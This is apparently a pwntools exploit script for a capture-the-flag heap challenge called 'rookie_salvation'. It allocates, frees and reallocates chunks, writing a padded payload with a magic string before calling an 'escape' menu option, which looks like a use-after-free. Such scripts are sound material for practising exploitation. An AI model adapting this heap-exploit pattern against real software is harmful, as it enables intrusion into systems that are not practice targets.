from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b main
breakrva 0x1990
continue
""".format(**locals())

exe = "./rookie_salvation"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = 72

io = start()


def malloc(idx, data):
    io.sendlineafter(b"> ", "1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", data)


def free():
    io.sendlineafter(b"> ", "2")


def escape():
    io.sendlineafter(b"> ", "3")


payload = flat([b"A" * 30, "w3th4nds"])

malloc(1032, b"test")
free()
malloc(32, payload)
escape()


io.interactive()
